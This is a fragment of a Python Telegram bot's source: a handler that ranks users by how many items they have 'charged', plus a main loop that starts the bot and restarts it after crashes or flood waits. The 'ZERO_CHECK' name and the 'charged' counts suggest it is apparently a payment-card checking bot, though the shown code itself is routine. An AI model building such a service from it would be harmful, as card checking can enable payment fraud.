        uid = ent.get("user_id"); cnt = ent.get("charged_count",0)
        try: u = await client.get_entity(uid); nm = u.first_name or str(uid)
        except: nm = str(uid)
        txt += f"{i}. {nm} – {cnt} {bs('charged')}\n"
    await styled_reply(event, txt, emoji_ids=[CE["crown"]])

# ─── Main ──────────────────────────────────────────────────────────────────
client_instance = client

async def main():
    global client_instance
    client_instance = client
    log_system("BOOT", "Initializing database...")
    await init_db()
    while True:
        try:
            log_system("BOOT", "Starting bot...")
            await client.start(bot_token=BOT_TOKEN)
            log_system("BOOT", "✅ ZERO_CHECK Bot Started!")
            await client.run_until_disconnected()
        except FloodWaitError as e:
            log_system("FLOOD", f"Sleeping {e.seconds+5}s", "warning")
            await asyncio.sleep(e.seconds + 5)
        except Exception as e:
            log_system("CRASH", f"{e}", "error")
            await asyncio.sleep(10)

if __name__ == "__main__":
    asyncio.run(main())
